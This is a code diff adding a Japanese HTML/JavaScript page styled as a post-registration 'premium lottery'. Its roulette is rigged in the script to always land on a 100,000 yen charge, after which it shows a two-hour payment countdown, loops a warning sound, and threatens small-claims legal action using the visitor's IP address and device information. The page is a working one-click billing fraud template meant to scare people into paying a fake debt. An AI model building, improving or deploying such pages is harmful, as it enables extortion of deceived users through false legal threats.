@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>🌟 特別限定抽選会場 🌟</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: radial-gradient(circle, #1a1a1a 0%, #0a0a0a 100%);
+            color: #fff;
+            font-family: 'Helvetica Neue', Arial, 'Hiragino Kaku Gothic ProN', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* 豪華な外枠 */
+        .celebration-wrap {
+            text-align: center;
+            max-width: 650px;
+            width: 90%;
+            background: rgba(255, 255, 255, 0.02);
+            border: 3px solid #dfb76c;
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 0 30px rgba(223, 183, 108, 0.3);
+            position: relative;
+            box-sizing: border-box;
+        }
+
+        .main-thanks-ttl {
+            font-size: 30px;
+            font-weight: 900;
+            margin: 0 0 10px 0;
+            background: linear-gradient(45deg, #b38728, #fbf5b7, #daa520, #fbf5b7, #aa771c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 10px rgba(251, 245, 183, 0.4);
+            letter-spacing: 1px;
+        }
+
+        .gold-line {
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #dfb76c, transparent);
+            margin: 20px 0;
+        }
+
+        /* ーーー 中心が絶対にぶれないルーレットのスタイル ーーー */
+        .roulette-container {
+            position: relative;
+            width: 260px;
+            height: 260px;
+            margin: 20px auto;
+        }
+
+        /* ルーレット本体 */
+        .roulette-wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 8px solid #dfb76c;
+            box-shadow: 0 0 20px rgba(223, 183, 108, 0.6);
+            background: conic-gradient(
+                from 0deg,
+                #cc0000 0deg 90deg,    /* 10万確定 */
+                #111111 90deg 180deg,  /* 免除 */
+                #cc0000 180deg 270deg, /* 10万確定 */
+                #111111 270deg 360deg  /* 免除 */
+            );
+            position: relative;
+            transform: rotate(0deg);
+            transition: transform 4s cubic-bezier(0.1, 0.8, 0.1, 1);
+            box-sizing: border-box; /* 【追加】線の太さをサイズに含めてズレを防止 */
+        }
+
+        /* 文字盤全体のコンテナ */
+        .wheel-text-wrapper {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+        }
+
+        /* 各文字の配置（中心点を基準に綺麗に回転配置してブレを防止） */
+        .w-txt {
+            position: absolute;
+            width: 80px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+            top: 50%;
+            left: 50%;
+            margin-top: -20px; /* 文字の高さの半分 */
+            margin-left: -40px; /* 文字の幅の半分 */
+        }
+        /* 中心から外側へずらして角度をつける */
+        .w-txt1 { transform: rotate(45deg) translate(0, -70px); color: #fff; }
+        .w-txt2 { transform: rotate(135deg) translate(0, -70px); color: #dfb76c; }
+        .w-txt3 { transform: rotate(225deg) translate(0, -70px); color: #fff; }
+        .w-txt4 { transform: rotate(315deg) translate(0, -70px); color: #dfb76c; }
+
+        /* ルーレットの矢印（上部固定） */
+        .roulette-arrow {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-top: 25px solid #ffcc00;
+            z-index: 10;
+            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.5));
+        }
+
+        /* 修正：ルーレットの中心軸（矢印の下、かつホイールの真ん中に完全固定） */
+        .roulette-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            /* 自身のサイズ（30px）の半分（15px）だけマイナス移動させて完全に中央配置 */
+            transform: translate(-50%, -50%); 
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(135deg, #fbf5b7, #dfb76c);
+            border: 2px solid #aa771c;
+            border-radius: 50%;
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.5);
+            z-index: 20; /* 盤面や文字よりも必ず上に重ねる */
+            box-sizing: border-box;
+        }
+
+        /* お支払いボックス */
+        .alert-box {
+            background: rgba(204, 0, 0, 0.15);
+            border: 2px solid #ff3333;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 25px;
+            box-shadow: 0 0 15px rgba(255, 51, 51, 0.2);
+            opacity: 0.3;
+            transition: opacity 0.5s, transform 0.5s;
+        }
+        .alert-box.activate {
+            opacity: 1;
+            animation: pulse 1s infinite alternate;
+        }
+
+        /* ⚖️ 法的措置に関する超厳格な警告エリア ⚖️ */
+        .legal-warning-box {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #cc0000;
+            color: #ff4444;
+            padding: 12px 15px;
+            border-radius: 4px;
+            margin-top: 15px;
+            font-size: 13px;
+            font-weight: bold;
+            line-height: 1.5;
+            text-align: left;
+            display: none; /* 最初は非表示にし、確定後に表示 */
+        }
+
+        .alert-text-large {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff4444;
+            margin-bottom: 5px;
+        }
+
+        .timer-display {
+            font-size: 36px;
+            font-weight: bold;
+            color: #ffcc00;
+            font-family: monospace;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.6);
+            background: #222;
+            padding: 5px 15px;
+            border-radius: 6px;
+            display: inline-block;
+            margin: 10px 0;
+            border: 1px solid #444;
+        }
+
+        .price-highlight {
+            font-size: 32px;
+            color: #ff3333;
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(255,0,0,0.3);
+        }
+
+        #status-message {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffcc00;
+            margin-top: 10px;
+            height: 24px;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 15px rgba(255, 51, 51, 0.2); }
+            100% { transform: scale(1.02); box-shadow: 0 0 25px rgba(255, 51, 51, 0.5); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="celebration-wrap">
+        <div style="font-size: 30px; margin-bottom: 5px;">🎰 PREMIUM CHANCE 🎰</div>
+        <h1 class="main-thanks-ttl">ご登録完了＆限定お支払い抽選</h1>
+        <p style="font-size: 13px; color: #ccc; margin: 0;">新規入会特典！お支払い免除を勝ち取れ！</p>
+        
+        <div class="roulette-container">
+            <div class="roulette-arrow"></div>
+            <div class="roulette-center"></div>
+            <div class="roulette-wheel" id="wheel">
+                <div class="wheel-text-wrapper">
+                    <div class="w-txt w-txt1">10万円<br>確定</div>
+                    <div class="w-txt w-txt2">全額<br>免除</div>
+                    <div class="w-txt w-txt3">10万円<br>確定</div>
+                    <div class="w-txt w-txt4">全額<br>免除</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="status-message">特別抽選システム起動中...</div>
+
+        <div class="gold-line"></div>
+        
+        <div class="alert-box" id="result-box">
+            <div class="alert-text-large" id="result-title">⏳ 抽選結果を待機中...</div>
+            <p style="font-size: 14px; margin: 5px 0;" id="result-desc">ルーレットが停止すると、お支払い期日カウントダウンが始まります。</p>
+            
+            <div class="timer-display" id="countdown-timer">02:00:00</div>
+            
+            <p style="font-size: 15px; margin: 10px 0 0 0; font-weight: bold;">
+                【ご請求金額】 <span class="price-highlight" id="final-price">?,??? 円</span>
+            </p>
+
+            <div class="legal-warning-box" id="legal-warning">
+                ⚖️ <strong>【重要宣告・警告措置】</strong><br>
+                本日より<strong>2日後（48時間以内）</strong>までにお支払い、またはご連絡が確認できない場合には、ご登録時のIPアドレスおよび端末識別情報を元に、管轄裁判所を通じて<strong>少額訴訟等の法的措置</strong>を取らせていただきます。
+            </div>
+        </div>
+        
+        <p style="font-size: 11px; color: #666; margin-top: 20px; margin-bottom: 0;">
+            ※特別規約により、本抽選結果の上書き・キャンセル・ページ戻りは一切認められません。
+        </p>
+    </div>
+
+    <script>
+                window.onload = function () {
+            const wheel = document.getElementById('wheel');
+            const statusMsg = document.getElementById('status-message');
+            const resultBox = document.getElementById('result-box');
+            const resultTitle = document.getElementById('result-title');
+            const resultDesc = document.getElementById('result-desc');
+            const finalPrice = document.getElementById('final-price');
+            const display = document.getElementById('countdown-timer');
+            const legalWarning = document.getElementById('legal-warning');
+
+            // 🔊 オーディオオブジェクトの作成と設定
+            const warningSound = new Audio('assets/sounds/keikokuon.mp3');
+            warningSound.volume = 0.8; // 音量設定（0.0 〜 1.0）
+            warningSound.loop = true;  // 🔥【追加】音をループ（無限リピート）再生させる設定
+
+            // ブラウザの自動再生ブロックを解除するための対策
+            const unlockAudio = () => {
+                warningSound.play().then(() => {
+                    warningSound.pause(); // 一瞬流してすぐ止める
+                    warningSound.currentTime = 0;
+                }).catch(e => console.log("Audio unlock pending..."));
+                document.removeEventListener('click', unlockAudio);
+            };
+            document.addEventListener('click', unlockAudio);
+
+            // ページ侵入1.5秒後に自動スタート
+            setTimeout(() => {
+                statusMsg.textContent = "🛑 自動抽選を開始しました！";
+                const targetRotation = 1800 + 135; 
+                wheel.style.transform = `rotate(${targetRotation}deg)`;
+            }, 1500);
+
+            // ルーレット停止・結果確定の瞬間（5.6秒後）
+            setTimeout(() => {
+                statusMsg.textContent = "🎉 抽選終了！！結果が確定しました。";
+                statusMsg.style.color = "#ff3333";
+                
+                resultBox.classList.add('activate');
+                resultTitle.textContent = "⚠️ 厳正なる抽選の結果【10万円支払い】確定";
+                resultDesc.innerHTML = "誠に残念ながら「全額免除」は当選しませんでした。<br>規約に基づき、2時間以内に10万円をお支払いください！";
+                finalPrice.textContent = "100,000円 (税込)";
+                
+                // 法的措置の警告文を表示
+                legalWarning.style.display = "block";
+
+                // 支払い確定の瞬間に警告音を再生（設定によりここから無限ループします）
+                warningSound.play().catch(error => {
+                    console.error("音の再生に失敗しました:", error);
+                });
+                
+                // 2時間のタイマーカウントダウンを開始
+                startTimer(2 * 60 * 60, display);
+                
+            }, 5600);
+        };
+
+        // タイマー管理ロジック（変更なし）
+        function startTimer(durationInSeconds, displayElement) {
+            let timer = durationInSeconds;
+            const interval = setInterval(function () {
+                let hours = Math.floor(timer / 3600);
+                let minutes = Math.floor((timer % 3600) / 60);
+                let seconds = Math.floor(timer % 60);
+
+                hours = hours < 10 ? "0" + hours : hours;
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                displayElement.textContent = hours + ":" + minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    displayElement.textContent = "00:00:00";
+                    displayElement.style.color = "#ff3333";
+                }
+            }, 1000);
+        }
+
+        function startTimer(durationInSeconds, displayElement) {
+            let timer = durationInSeconds;
+            const interval = setInterval(function () {
+                let hours = Math.floor(timer / 3600);
+                let minutes = Math.floor((timer % 3600) / 60);
+                let seconds = Math.floor(timer % 60);
+
+                hours = hours < 10 ? "0" + hours : hours;
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                displayElement.textContent = hours + ":" + minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    displayElement.textContent = "00:00:00";
+                    displayElement.style.color = "#ff3333";
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
